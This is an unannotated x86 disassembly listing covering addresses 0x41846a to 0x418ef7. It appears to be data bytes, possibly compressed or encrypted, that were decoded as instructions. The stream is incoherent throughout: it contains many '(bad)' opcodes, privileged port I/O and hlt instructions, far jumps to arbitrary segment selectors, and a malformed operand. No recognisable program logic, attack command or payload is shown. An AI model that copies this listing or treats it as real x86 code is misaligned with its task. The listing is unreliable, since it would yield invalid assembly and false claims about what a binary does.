  41846a:	sbb    al,0x5b
  41846c:	add    BYTE PTR [eax+ecx*4+0x5b],ah
  418470:	add    cl,ch
  418472:	pop    ds
  418473:	in     al,0xcb
  418475:	adc    ch,al
  418477:	loope  0x4184c5
  418479:	add    eax,0xd4c542c
  41847e:	xor    al,0x68
  418480:	test   DWORD PTR [ebx],edx
  418482:	pop    ds
  418483:	pop    ebx
  418484:	add    BYTE PTR [edx+0x63],dh
  418487:	aas    
  418488:	adc    BYTE PTR [ebx+0x23],dh
  41848b:	call   0x9d89:0x5b229d37
  418492:	add    ebp,DWORD PTR [edi-0x47]
  418495:	jmp    0x4184b6
  418497:	pop    ebx
  418498:	add    BYTE PTR [ebp-0x3271abe5],dl
  41849e:	retf   
  41849f:	cdq    
  4184a0:	std    
  4184a1:	fiadd  WORD PTR [edx-0x5b]
  4184a4:	add    cl,ch
  4184a6:	pop    ds
  4184a7:	in     al,0x54
  4184a9:	(bad)
  4184ac:	fidivr DWORD PTR [edx-0x2]
  4184af:	in     eax,0x4b
  4184b1:	jmp    0x418443
  4184b3:	sub    BYTE PTR [ecx],0x55
  4184b6:	cmp    al,0x43
  4184b8:	mov    ah,BYTE PTR ds:0xe83a5b25
  4184be:	or     al,0x61
  4184c0:	inc    ecx
  4184c1:	sub    BYTE PTR [edi-0x4b],al
  4184c4:	jb     0x418481
  4184c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184c7:	es and al,0xd5
	...
  4184f2:	add    BYTE PTR [esi+0x27012406],ah
  4184f8:	mov    ch,0xd
  4184fa:	gs jns 0x418557
  4184fd:	add    cl,ch
  4184ff:	push   ss
  418500:	aaa    
  418501:	and    al,0xf9
  418503:	rcr    DWORD PTR [edi],0x51
  418506:	cmp    BYTE PTR [edi+0x465be8a8],dl
  41850c:	xchg   edi,eax
  41850d:	std    
  41850e:	add    BYTE PTR [esi-0x51efdbde],ch
  418514:	sub    ah,BYTE PTR [eax+ebx*1]
  418517:	add    al,0x2d
  418519:	xchg   esi,ecx
  41851b:	mov    esi,0x7f9fe886
  418520:	nop
  418521:	sti    
  418522:	sub    ebp,DWORD PTR [ebp-0x1c]
  418525:	dec    esp
  418526:	and    al,0x9
  418528:	pop    esi
  418529:	jmp    0xc4c227e6
  41852e:	dec    esi
  41852f:	cmp    al,BYTE PTR [edx+0x47196c87]
  418535:	mov    ebp,0xc2e5f7fa
  41853a:	rcr    DWORD PTR [ebp+0x70],0xff
  41853e:	rol    esi,0x58
  418541:	and    al,0x10
  418543:	mov    esi,0x3c0676b4
  418548:	and    esp,DWORD PTR [eax+ebx*1]
  41854b:	push   ds
  41854c:	and    eax,0x98e98e37
  418551:	std    
  418552:	jmp    FWORD PTR [eax]
  418554:	push   esi
  418555:	dec    edi
  418556:	push   ecx
	...
  41857f:	add    BYTE PTR [esi],bh
  418581:	mov    eax,ds:0x91af63e8
  418586:	sti    
  418587:	mov    ebx,DWORD PTR [ecx+0x3b]
  41858a:	adc    BYTE PTR [ebx+0x2444e56d],cl
  418590:	lea    ebp,[edx]
  418592:	push   eax
  418593:	mov    esp,DWORD PTR [ebx+0x62fa5084]
  418599:	xchg   ecx,eax
  41859a:	xchg   eax,ecx
  41859c:	push   cs
  41859d:	mov    ds:0x47196c87,al
  4185a2:	mov    eax,0x2ac29fab
  4185a7:	imul   DWORD PTR [ebp+eiz*8+0x71acc1ca]
  4185ae:	dec    ecx
  4185b0:	sbb    al,0x85
  4185b2:	retf   0xd039
  4185b5:	popf   
  4185b6:	adc    DWORD PTR [edx+0x28],esi
  4185b9:	or     eax,0xb08244d
  4185be:	dec    ebp
  4185bf:	and    al,0x4
  4185c1:	sti    
  4185c2:	push   esp
  4185c3:	and    al,0xc
  4185c5:	aaa    
  4185c6:	jle    0x4185c8
  4185c8:	test   BYTE PTR [ebx+0x7d9a3901],al
  4185ce:	std    
  4185cf:	dec    DWORD PTR [ebx]
  4185d1:	mov    eax,0xb59a8919
  4185d6:	std    
  4185d7:	(bad)  
  4185d8:	sti    
  4185d9:	pop    esp
  4185da:	cld    
  4185db:	jbe    0x4185f5
  4185dd:	ins    DWORD PTR es:[edi],dx
  4185de:	cld    
  4185df:	jmp    0x803de2fc
	...
  41860c:	add    bl,bl
  41860e:	sub    DWORD PTR [ecx-0x1],0x30ff6cdb
  418615:	ror    DWORD PTR [ebx+eax*1],cl
  418618:	mov    DWORD PTR [eax],ecx
  41861a:	sub    ecx,DWORD PTR [edx+0x17dfc86]
  418620:	add    BYTE PTR [edi],bl
  418622:	dec    ecx
  418623:	sub    BYTE PTR [eax+edi*8-0x4b],0x4
  418628:	je     0x418638
  41862a:	pop    es
  41862b:	test   BYTE PTR ds:0xfdf34799,0x9b
  418632:	lods   al,BYTE PTR ds:[esi]
  418633:	or     al,0x87
  418635:	loopne 0x418694
  418637:	sbb    al,0x87
  418639:	call   0xd8ca9aa3
  41863e:	pop    ebp
  41863f:	and    BYTE PTR [ecx-0x76eb9a30],cl
  418645:	loopne 0x4186a4
  418647:	sbb    al,0x5d
  418649:	retf   0x896e
  41864c:	push   eax
  41864d:	sbb    bl,bh
  41864f:	or     ebx,DWORD PTR [ecx-0x61]
  418652:	pop    edx
  418653:	stos   DWORD PTR es:[edi],eax
  418654:	adc    al,0x5e
  418656:	push   0xffffffe7
  418658:	cmp    BYTE PTR [eax],0x52
  41865b:	push   0x78
  41865d:	clc    
  41865e:	push   ds
  41865f:	out    0x4d,eax
  418661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418662:	mov    esp,edi
  418664:	or     ch,ch
  418666:	call   0x1ca9:0x5260811d
  41866d:	sbb    al,0xe4
  41866f:	and    esp,DWORD PTR [eax]
	...
  418699:	add    BYTE PTR [eax+eiz*8+0x27],bl
  41869d:	outs   dx,DWORD PTR ds:[esi]
  41869e:	fisubr DWORD PTR es:[edi]
  4186a1:	cmc    
  4186a2:	push   0xffffffda
  4186a4:	sub    edi,DWORD PTR [esi+ebx*8]
  4186a7:	jae    0x418690
  4186a9:	mov    BYTE PTR [eax+0x3f],ch
  4186ac:	stos   DWORD PTR es:[edi],eax
  4186ad:	jle    0x41868a
  4186af:	cmovge ecx,DWORD PTR [ecx+0x7ea33f50]
  4186b6:	into   
  4186b7:	cmovne ecx,DWORD PTR [ebx+0x3eb6fa2]
  4186be:	sbb    al,0x23
  4186c0:	jo     0x418740
  4186c2:	cld    
  4186c3:	pop    esi
  4186c4:	out    0x3,eax
  4186c6:	fwait
  4186c7:	in     eax,0xf7
  4186c9:	(bad)  
  4186ca:	mov    ebx,0xb5e63f96
  4186cf:	test   DWORD PTR [edx+0x31],edx
  4186d2:	jecxz  0x418702
  4186d4:	out    0xad,al
  4186d6:	imul   ebx,DWORD PTR [ebx-0x49],0x42
  4186da:	sbb    al,0xac
  4186dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186dd:	xor    BYTE PTR [ecx+0x66],bl
  4186e0:	xchg   ebp,eax
  4186e1:	mov    edx,0x428468b
  4186e6:	push   ebx
  4186e7:	fwait
  4186e8:	sbb    bh,BYTE PTR [ebp+0x180cd29]
  4186ee:	sub    al,0x1c
  4186f0:	out    0xd2,eax
  4186f2:	pop    esp
  4186f3:	dec    edx
  4186f4:	add    BYTE PTR [esi-0x154832e8],ch
  4186fa:	orps   xmm0,XMMWORD PTR [eax]
  4186fd:	mov    eax,0x0
	...
  418726:	add    BYTE PTR [edi-0x24],bl
  418729:	mov    edi,0x7fa00ce5
  41872e:	nop
  41872f:	pop    ds
  418730:	xchg   esi,eax
  418731:	std    
  418732:	jmp    0xa9c524e4
  418737:	sbb    dl,bl
  418739:	mov    ecx,0x515b1ff0
  41873e:	pusha  
  41873f:	adc    edx,esp
  418741:	dec    esi
  418742:	in     eax,0x9e
  418744:	cwde   
  418745:	sbb    BYTE PTR [ecx-0x164169ee],cl
  41874b:	push   ds
  41874c:	pop    ebx
  41874d:	add    BYTE PTR [edi+eiz*2-0x6a],ah
  418751:	push   esp
  418752:	pusha  
  418753:	push   cs
  418754:	dec    esp
  418755:	shr    ah,0x1f
  418758:	pop    ebx
  418759:	add    cl,ch
  41875b:	xchg   esp,eax
  41875c:	cmp    eax,0x95e2adc5
  418761:	std    
  418762:	jmp    0x29c2e286
  418767:	rcl    DWORD PTR [eax+0x0],cl
  41876a:	in     eax,0x1f
  41876c:	pop    ebx
  41876d:	jb     0x418774
  41876f:	sahf   
  418770:	cwde   
  418771:	add    ch,ah
  418773:	pop    ds
  418774:	pop    ebx
  418775:	sub    DWORD PTR [eax],0x74f942b3
  41877b:	(bad)  
  41877d:	mov    ds,ebp
  41877f:	mov    ds:0x2962fd95,eax
  418784:	fmul   st(0),st
  418786:	out    0x11,al
  418788:	frstor [eiz*8+0x0]
	...
  4187b3:	add    BYTE PTR [edi],bl
  4187b5:	pop    ebx
  4187b6:	xchg   DWORD PTR [edi-0x80],esp
  4187b9:	pop    ecx
  4187ba:	add    cl,ch
  4187bc:	clc    
  4187bd:	hlt    
  4187be:	add    al,0x0
  4187c0:	sbb    DWORD PTR [ecx+0x0],0x45aeb89
  4187c7:	add    BYTE PTR [ebp+0x16],dh
  4187ca:	cmp    cl,BYTE PTR [ebx+0x472fb]
  4187d0:	inc    ebp
  4187d1:	adc    al,0x96
  4187d3:	adc    BYTE PTR [ecx+0x59],al
  4187d6:	add    BYTE PTR [ecx+0x476eb],cl
  4187dc:	inc    ebp
  4187dd:	pop    ss
  4187de:	add    eax,0x1c430189
  4187e3:	mov    eax,DWORD PTR [ecx]
  4187e5:	inc    ebx
  4187e6:	push   esp
  4187e7:	mov    BYTE PTR [edi],bh
  4187e9:	pop    esi
  4187ea:	sahf   
  4187eb:	adc    al,0x1
  4187ed:	pop    ecx
  4187ee:	add    BYTE PTR [ecx],al
  4187f0:	fwait
  4187f1:	outs   dx,DWORD PTR ds:[esi]
  4187f2:	add    al,0x0
  4187f4:	cmc    
  4187f5:	push   eax
  4187f6:	test   DWORD PTR [ecx+edx*1+0x6f],edi
  4187fa:	test   DWORD PTR [ecx+eiz*1+0x67],edi
  4187fe:	test   DWORD PTR [esi+0x5cf9],ebx
  418804:	ins    BYTE PTR es:[edi],dx
  418805:	sub    esp,DWORD PTR [eax+ebx*2]
  418808:	out    dx,al
  418809:	popf   
  41880a:	or     eax,DWORD PTR [esi+0x6016]
  418810:	dec    eax
  418811:	in     al,0x0
  418813:	add    BYTE PTR [ebp+0x448758],dh
	...
  418841:	shl    DWORD PTR [ecx+eax*4],1
  418844:	rcl    BYTE PTR [ecx-0x1eb378ba],0x60
  41884b:	cmp    eax,0x183c7989
  418850:	test   ah,bh
  418852:	adc    DWORD PTR [ecx],ebp
  418854:	mov    esi,DWORD PTR [ecx+0xb8b603c]
  41885a:	push   0x75750004
  41885f:	dec    esp
  418860:	and    al,0x1c
  418862:	push   edx
  418863:	push   esi
  418864:	mov    DWORD PTR [edx+0x1c00058e],edx
  41886a:	imul   ebx,DWORD PTR [eax+0x24],0x4c7d72cc
  418871:	cmp    BYTE PTR [esi+0x56],ch
  418874:	dec    edi
  418875:	pop    ebx
  418876:	repnz xchg ah,al
  418879:	sub    al,0x7
  41887b:	ror    DWORD PTR ds:0x96fa0,0x1c
  418882:	test   eax,0x6f18244d
  418887:	push   ss
  418888:	mov    eax,eax
  41888a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41888b:	inc    ebp
  41888c:	mov    eax,edx
  41888e:	popf   
  41888f:	inc    ecx
  418890:	xchg   DWORD PTR [eax+0x70871da5],esi
  418896:	sahf   
  418897:	sbb    ecx,ebp
  418899:	xor    ecx,DWORD PTR [ecx]
  41889b:	inc    ebp
  41889c:	and    al,0x70
  41889e:	or     DWORD PTR [edi+0x14],edi
  4188a1:	sbb    BYTE PTR [edx+0x2901],al
	...
  4188cb:	add    BYTE PTR [eax],al
  4188cd:	add    bh,bl
  4188cf:	rcl    DWORD PTR [esi+0x4f],1
  4188d2:	mov    eax,ds:0x4e3425f5
  4188d7:	or     DWORD PTR [edi-0xdb76018],edi
  4188dd:	std    
  4188de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188df:	aad    0x25
  4188e1:	sub    al,0x9f
  4188e3:	add    ecx,DWORD PTR ds:0x81b98
  4188ea:	sbb    al,0xf9
  4188ec:	xchg   BYTE PTR [eax+eiz*1],ah
  4188ef:	add    BYTE PTR [ecx],0xc5
  4188f2:	pop    eax
  4188f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f4:	adc    eax,0x1821c00
  4188f9:	aaa    
  4188fa:	pop    eax
  4188fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188fc:	sbb    DWORD PTR [ebx-0x2],esi
  4188ff:	add    dl,dh
  418901:	jmp    DWORD PTR [edx]
  418903:	pop    ebx
  418904:	ins    DWORD PTR es:[edi],dx
  418905:	push   esi
  418906:	sbb    eax,0xd82ae75b
  41890b:	smsw   WORD PTR ds:[eax+0x1c03ea22]
  418913:	loopne 0x418940
  418915:	sub    BYTE PTR [esp+ebp*1],cl
  418918:	adc    dl,cl
  41891a:	int    0x2a
  41891c:	(bad)
  418921:	icebp  
  418922:	push   ecx
  418923:	fbstp  TBYTE PTR [ebx]
  418925:	sub    BYTE PTR [esp+ebp*1],al
  418928:	cmp    BYTE PTR [ebp+0x52],bh
  41892b:	fild   QWORD PTR [edi-0x71748f24]
  418931:	icebp  
	...
  41895a:	add    ch,dh
  41895c:	xchg   edi,eax
  41895d:	idiv   BYTE PTR [esi+0x7]
  418960:	pop    eax
  418961:	out    0x3,eax
  418963:	xchg   ebp,eax
  418964:	push   ds
  418965:	retf   
  418966:	sub    edx,DWORD PTR [edi+0x5b]
  418969:	in     al,0x3
  41896b:	sbb    al,0xf
  41896d:	lock test BYTE PTR [ecx],cl
  418970:	pop    esi
  418971:	out    dx,al
  418972:	xchg   DWORD PTR [ebx],ebx
  418974:	pop    esi
  418975:	out    0x3,eax
  418977:	aaa    
  418978:	pop    ebx
  418979:	int3   
  41897a:	add    ebx,DWORD PTR [edi+ecx*1]
  41897d:	lock test cl,ch
  418980:	pop    esi
  418981:	out    dx,al
  418982:	xchg   ebx,ebp
  418984:	pop    ebp
  418985:	out    0x3,eax
  418987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418988:	das    
  418989:	add    ecx,DWORD PTR [ebp+eiz*4+0x17]
  41898d:	retf   
  41898e:	push   edi
  41898f:	xchg   ebp,eax
  418990:	jmp    0x5b5d9188
  418995:	ret    0xa3c4
  418998:	pop    ss
  418999:	ret    
  41899a:	and    esp,DWORD PTR [ebx+ebp*1+0x74]
  41899e:	cmp    eax,0x55a92bab
  4189a3:	xchg   edi,eax
  4189a4:	pop    ss
  4189a5:	add    ch,cl
  4189a7:	pop    ebx
  4189a8:	sub    ecx,DWORD PTR [ecx-0x5508fe1]
  4189ae:	out    0x8c,al
  4189b0:	in     al,0x4c
  4189b2:	add    eax,0xd4c4a20
  4189b7:	loopne 0x41899e
  4189b9:	inc    ecx
  4189ba:	call   0xe565a0b5
	...
  4189e7:	add    dl,dl
  4189e9:	push   cs
  4189ea:	aaa    
  4189eb:	jb     0x418a3b
  4189ed:	sub    eax,0x1777a789
  4189f2:	cmc    
  4189f3:	scas   al,BYTE PTR es:[edi]
  4189f4:	dec    esp
  4189f5:	in     al,0x4c
  4189f7:	int    0xdf
  4189f9:	fld    DWORD PTR [ebp+eax*8-0x5]
  4189fd:	jecxz  0x418a43
  4189ff:	int    0xe3
  418a01:	sub    cl,BYTE PTR [edi+0x62]
  418a04:	pop    ebp
  418a05:	sub    DWORD PTR ds:0x89902c7e,0x2d
  418a0c:	hlt    
  418a0d:	sub    DWORD PTR ss:[ecx-0x4f4765e0],esp
  418a14:	popf   
  418a15:	jnp    0x418a4f
  418a17:	pop    esi
  418a18:	out    0xa1,al
  418a1a:	cli    
  418a1b:	jb     0x4189f6
  418a1d:	shr    eax,1
  418a1f:	mul    BYTE PTR [eax]
  418a21:	popf   
  418a22:	jmp    0x2460fb40
  418a27:	adc    eax,0x51cee44f
  418a2c:	out    0x86,al
  418a2e:	std    
  418a2f:	ss pop eax
  418a31:	daa    
  418a32:	and    al,0xa5
  418a34:	push   eax
  418a35:	mov    bl,0x89
  418a37:	lods   eax,DWORD PTR ds:[esi]
  418a38:	add    ebx,DWORD PTR [ebx]
  418a3a:	push   edx
  418a3b:	mov    ecx,0x1fe8a140
  418a40:	mov    ch,0x8f
  418a42:	std    
  418a43:	ret    0xe3e7
  418a46:	rol    DWORD PTR [eax],0x2e
  418a49:	and    ah,BYTE PTR [eax+ebx*2]
	...
  418a74:	add    BYTE PTR [edi+edx*8],bh
  418a77:	loop   0x418a7c
  418a79:	xchg   BYTE PTR [edi+0x5687f8bd],dl
  418a7f:	inc    esp
  418a80:	and    al,0x39
  418a82:	inc    esi
  418a83:	call   0x44da1805
  418a88:	and    al,0x79
  418a8a:	push   esi
  418a8b:	add    BYTE PTR [eax],al
  418a8d:	test   edx,esp
  418a8f:	sti    
  418a90:	jbe    0x418aaf
  418a92:	inc    eax
  418a93:	ins    BYTE PTR es:[edi],dx
  418a94:	and    al,0x39
  418a96:	or     esi,DWORD PTR [eax]
  418a98:	mov    eax,DWORD PTR [ecx]
  418a9a:	inc    ebx
  418a9b:	sub    BYTE PTR [ebp+0x34],dl
  418a9e:	push   ss
  418a9f:	into   
  418aa0:	call   0x3d1368
  418aa5:	into   
  418aa6:	xor    ah,BYTE PTR [esp+eax*2]
  418aa9:	mov    esi,0x5944879e
  418aae:	sbb    eax,0xd0ae5052
  418ab3:	call   0xfbc33663
  418ab8:	cmp    eax,esi
  418aba:	adc    al,0x5c
  418abc:	and    al,0x2d
  418abe:	or     cl,BYTE PTR [eax]
  418ac0:	(bad)  
  418ac1:	mov    ecx,0xf5011438
  418ac6:	pop    esp
  418ac7:	add    BYTE PTR [ebp+0x39491252],al
  418acd:	mov    cl,0x38
  418acf:	inc    esp
  418ad0:	jge    0x418a8c
  418ad2:	adc    eax,0x5cf9148e
  418ad7:	add    BYTE PTR [edx+0x0],ch
	...
  418b02:	les    ebp,FWORD PTR ds:0xaf338b4d
  418b08:	fwait
  418b09:	repz add al,BYTE PTR [eax+0x18d95487]
  418b10:	xchg   eax,ebx
  418b12:	sbb    al,0xfd
  418b14:	inc    edi
  418b15:	and    al,0x5c
  418b17:	aam    0x51
  418b19:	mov    edx,ebx
  418b1b:	push   0x5f
  418b1d:	mul    BYTE PTR [ebx+0x404c7a91]
  418b23:	call   0x5c7f:0x70a74f58
  418b2a:	and    al,0x83
  418b2c:	fstp   DWORD PTR [edx+ecx*4-0x4f]
  418b30:	out    dx,al
  418b31:	cmp    DWORD PTR [ebp+edi*8+0x4c],edx
  418b35:	and    al,0xd4
  418b37:	pop    ds
  418b38:	cli    
  418b39:	(bad)  
  418b3a:	loopne 0x418b99
  418b3c:	sbb    BYTE PTR [eax],al
  418b3e:	sbb    al,0x82
  418b40:	add    ecx,ebp
  418b42:	daa    
  418b43:	add    eax,0x8228246d
  418b48:	inc    BYTE PTR [edx+0x1855a]
  418b4e:	lahf   
  418b4f:	out    dx,eax
  418b50:	dec    DWORD PTR [edx+ebp*4]
  418b53:	sbb    eax,0xfd1c0004
  418b58:	push   esp
  418b59:	and    al,0xfc
  418b5b:	or     al,0x83
  418b5d:	adc    al,0x18
  418b5f:	add    BYTE PTR [ecx],0x81
  418b62:	fiadd  WORD PTR [edi]
  418b64:	dec    edi
  418b65:	add    DWORD PTR [eax],0x0
	...
  418b8f:	fild   WORD PTR [ebx-0x7c237eae]
  418b95:	push   ecx
  418b96:	mov    edx,DWORD PTR [eax+0x56]
  418b99:	xor    BYTE PTR [edi-0x59],cl
  418b9c:	aaa    
  418b9d:	fst    DWORD PTR [eax-0x7611df0b]
  418ba3:	pusha  
  418ba4:	pop    esi
  418ba5:	xor    al,0x39
  418ba7:	pop    eax
  418ba8:	push   esi
  418ba9:	sbb    al,0x89
  418bab:	jo     0x418c0b
  418bad:	cmp    BYTE PTR [edx-0x59],dl
  418bb0:	outs   dx,DWORD PTR ds:[esi]
  418bb1:	push   ecx
  418bb2:	jl     0x418bb3
  418bb4:	pop    edx
  418bb5:	(bad)  
  418bb7:	iret   
  418bb8:	(bad)  
  418bb9:	push   ds
  418bba:	jp     0x418b90
  418bbc:	jecxz  0x418b69
  418bbe:	daa    
  418bbf:	add    al,0x26
  418bc1:	mov    bh,0x7a
  418bc3:	fiadd  DWORD PTR [edx-0x705e07eb]
  418bc9:	rol    dl,cl
  418bcb:	mov    bl,0xdb
  418bcd:	or     DWORD PTR [edx],eax
  418bcf:	sbb    eax,0xcbbb629d
  418bd4:	xchg   ecx,eax
  418bd5:	jmp    0xc1c4c2b2
  418bda:	idiv   DWORD PTR [ecx-0x71]
  418bdd:	(bad)  
  418bde:	int3   
  418bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be0:	push   ss
  418be1:	add    ebx,DWORD PTR [edi+ecx*8]
  418be4:	sub    dh,BYTE PTR [edx-0x42]
  418be7:	je     0x418b8c
  418be9:	mov    ah,0xed
  418beb:	pop    ecx
  418bec:	jecxz  0x418b8d
  418bee:	sbb    DWORD PTR [ebp+0x5b],esp
  418bf1:	mov    al,ds:0xac
	...
  418c1a:	add    BYTE PTR [eax],al
  418c1c:	inc    ebx
  418c1d:	mov    esp,0x81491e72
  418c22:	mov    eax,0xa8a4a5ea
  418c27:	fist   DWORD PTR [ecx]
  418c29:	pop    esp
  418c2a:	mov    eax,ds:0xbb36e079
  418c2f:	add    BYTE PTR [ebx+edx*2-0x70],dl
  418c33:	outs   dx,DWORD PTR ds:[esi]
  418c34:	and    al,0x96
  418c36:	sub    ebp,DWORD PTR [eax]
  418c38:	sub    BYTE PTR [edi+eiz*8+0x3],bl
  418c3c:	sbb    al,0xd8
  418c3e:	data16 jbe 0x418c75
  418c41:	push   edx
  418c42:	and    al,0x70
  418c44:	inc    eax
  418c45:	loop   0x418c02
  418c47:	daa    
  418c48:	sub    al,0x2b
  418c4a:	mov    ecx,0x7583da78
  418c4f:	mul    ecx
  418c51:	mov    ?,WORD PTR [edx-0x34]
  418c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c55:	pop    ss
  418c56:	add    BYTE PTR ds:0x62502a30,cl
  418c5c:	mov    al,BYTE PTR [ebx-0x6f4ee383]
  418c62:	cmp    DWORD PTR [ecx-0x47],eax
  418c65:	loop   0x418c69
  418c67:	jmp    0x6703:0x8d815b1f
  418c6e:	add    dh,dh
  418c70:	call   0xfbdc:0x1fe90288
  418c77:	jmp    0x5b1f:0xe9d4e090
  418c7e:	mov    DWORD PTR ds:0x0,esi
	...
  418ca8:	add    BYTE PTR [ebx+edi*1],dh
  418cab:	mov    DWORD PTR ds:0x6f893344,esi
  418cb1:	or     edx,DWORD PTR [edi+0x0]
  418cb4:	jmp    0x193d5b55
  418cb9:	popf   
  418cba:	cdq    
  418cbb:	add    DWORD PTR [ebx],ebx
  418cbd:	popf   
  418cbe:	fwait
  418cbf:	add    DWORD PTR [ecx],ebx
  418cc1:	rcr    DWORD PTR [esi],cl
  418cc3:	and    al,0xed
  418cc5:	out    dx,al
  418cc6:	jecxz  0x418c96
  418cc8:	xchg   ecx,eax
  418cc9:	jbe    0x418c5e
  418ccb:	std    
  418ccc:	sahf   
  418ccd:	mov    ah,0x16
  418ccf:	and    al,0xd9
  418cd1:	mov    ah,0x26
  418cd3:	and    al,0xd5
  418cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd6:	cs and al,0xd1
  418cd9:	hlt    
  418cda:	fwait
  418cdb:	push   edx
  418cdc:	jb     0x418cb7
  418cde:	sub    bh,BYTE PTR [esp+ecx*8-0x9]
  418ce2:	rep outs dx,BYTE PTR ss:[esi]
  418ce5:	clc    
  418ce6:	sub    DWORD PTR [ecx+0x72],edx
  418ce9:	rcl    ebp,0x44
  418cec:	add    eax,0x5c15833c
  418cf1:	add    BYTE PTR [eax+0x37439d89],dl
  418cf7:	sub    DWORD PTR [eax],eax
  418cf9:	xor    al,0xe1
  418cfb:	jg     0x418cdf
  418cfd:	(bad)  
  418cfe:	pop    edx
  418cff:	ret    0xfd8b
  418d02:	cwde   
  418d03:	cmc    
  418d04:	add    bl,BYTE PTR [esi+0x6e]
  418d07:	call   0xfbc0af0b
  418d0c:	push   ebp
	...
  418d35:	add    BYTE PTR [esi+0x12],dh
  418d38:	into   
  418d39:	mov    DWORD PTR [ecx+0x7e82c35],eax
  418d3f:	xchg   bl,bh
  418d41:	jmp    FWORD PTR [esi]
  418d43:	rol    BYTE PTR [edi+0x27356144],cl
  418d49:	enter  0xd086,0xb8
  418d4d:	jmp    0xf76fa029
  418d52:	ins    BYTE PTR es:[edi],dx
  418d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d54:	cli    
  418d55:	mov    ebp,DWORD PTR [edi-0x79e01a69]
  418d5b:	iret   
  418d5c:	xchg   DWORD PTR [ecx+eiz*1+0x4b],eax
  418d60:	inc    edi
  418d62:	push   ds
  418d63:	mov    al,0x79
  418d65:	or     BYTE PTR [edx+0x4414241a],al
  418d6b:	pop    ecx
  418d6c:	add    BYTE PTR [eax],al
  418d6e:	rol    BYTE PTR [ecx-0x65c1d78a],0x7c
  418d75:	and    al,0xae
  418d77:	sub    ah,BYTE PTR [eax+esi*1]
  418d7a:	cmc    
  418d7b:	and    al,0x87
  418d7d:	into   
  418d7e:	popf   
  418d7f:	(bad)  
  418d80:	hlt    
  418d81:	call   FWORD PTR [edx+0x418bd80d]
  418d87:	cmp    ebp,DWORD PTR [eax]
  418d89:	push   ebp
  418d8a:	xor    eax,0x57e8ce0c
  418d8f:	mov    edi,ebx
  418d91:	(bad)  
  418d92:	ds lahf 
  418d94:	or     ecx,DWORD PTR [eax+eiz*1+0x55]
	...
  418dc3:	sbb    al,0x1
  418dc5:	push   0xfa821024
  418dca:	add    BYTE PTR [esi],0x80
  418dcd:	add    DWORD PTR [eax],eax
  418dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dd0:	out    dx,al
  418dd1:	sbb    eax,0xf9459958
  418dd6:	xor    DWORD PTR [edi],0xffffff83
  418dd9:	add    DWORD PTR [eax],eax
  418ddb:	lahf   
  418ddc:	xor    eax,0xd2a20d03
  418de1:	add    al,0x0
  418de3:	sbb    al,0xf9
  418de5:	dec    edi
  418de6:	and    al,0x50
  418de8:	stc    
  418de9:	mov    eax,0x7d729
  418dee:	or     dl,BYTE PTR [edi+0x35]
  418df1:	jb     0x418df5
  418df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df4:	cmp    eax,0x95e08954
  418df9:	or     eax,0x54516329
  418dfe:	mov    ebp,eax
  418e00:	push   ebp
  418e01:	sub    BYTE PTR [edi-0x59],cl
  418e04:	mov    ah,0x7c
  418e06:	pop    esp
  418e07:	inc    eax
  418e08:	push   esi
  418e09:	fmul   st(4),st
  418e0b:	imul   edx,DWORD PTR [ebp+0x55d837ea],0x30
  418e12:	jb     0x418e1c
  418e14:	stc    
  418e15:	dec    esp
  418e16:	and    al,0xc
  418e18:	gs push esi
  418e1a:	mov    DWORD PTR [edx-0x16],edx
  418e1d:	sub    ah,dh
  418e1f:	cmp    ebp,ebp
  418e21:	jle    0x418dfb
  418e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e24:	and    BYTE PTR ds:[eax],bh
	...
  418e4f:	add    bl,dl
  418e51:	push   ecx
  418e52:	jge    0x418e22
  418e54:	xor    al,0xa4
  418e56:	in     eax,dx
  418e57:	std    
  418e58:	sbb    ebx,DWORD PTR [ecx-0x618f763a]
  418e5e:	or     eax,0x34f92c7e
  418e63:	and    al,0x4c
  418e65:	pop    ebx
  418e66:	jb     0x418eb7
  418e68:	inc    eax
  418e69:	inc    edi
  418e6a:	jo     0x418ea3
  418e6c:	cmp    BYTE PTR [ebx+0x60],dl
  418e6f:	dec    edi
  418e70:	inc    eax
  418e71:	dec    edi
  418e72:	bound  edi,QWORD PTR [edi]
  418e74:	cmp    BYTE PTR [ebx-0x62],ch
  418e77:	push   esi
  418e78:	ins    BYTE PTR es:[edi],dx
  418e79:	loopne 0x418ea8
  418e7b:	(bad)  
  418e7d:	mov    DWORD PTR [esi],esi
  418e7f:	jmp    0x2a69:0x2c031e95
  418e86:	jb     0x418e41
  418e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e89:	mov    dl,0xf
  418e8b:	in     al,dx
  418e8c:	lods   eax,DWORD PTR ds:[esi]
  418e8d:	mov    edx,DWORD PTR [esi]
  418e8f:	fstp   QWORD PTR cs:[ebx+0x5c]
  418e93:	mov    ds:0x7ee75b1c,al
  418e98:	clc    
  418e99:	ss iret 
  418e9b:	cs mov dl,0x36
  418e9e:	jmp    0x418ea3
  418ea0:	sbb    al,0x6
  418ea2:	(bad)  
  418ea3:	jle    0x418e8d
  418ea5:	ss sti 
  418ea7:	jl     0x418e89
  418ea9:	not    DWORD PTR ss:[eax-0x32]
  418ead:	sub    ah,BYTE PTR [edx-0x46]
  418eb0:	je     0x418e3a
  418eb2:	xlat   BYTE PTR ds:[ebx]
  418eb3:	jmp    0x418eb8
	...
  418edc:	add    BYTE PTR [ecx+0x25],ah
  418edf:	sbb    bh,BYTE PTR [ebp+0x6a]
  418ee2:	loope  0x418f07
  418ee4:	and    BYTE PTR [eax],al
  418ee6:	sub    DWORD PTR [ebp+0x628b49f5],0x38
  418eed:	clc    
  418eee:	ss jmp 0x9b46:0x34a7a5bb
  418ef6:	push   ds
  418ef7:	retf   
